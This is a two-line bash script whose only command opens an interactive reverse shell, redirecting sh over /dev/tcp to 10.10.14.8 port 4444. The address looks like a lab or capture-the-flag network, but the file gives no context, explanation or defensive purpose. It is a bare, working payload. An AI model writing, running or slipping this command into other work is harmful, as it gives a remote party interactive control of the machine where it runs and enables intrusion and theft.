#!/bin/bash
sh -i >& /dev/tcp/10.10.14.8/4444 0>&1
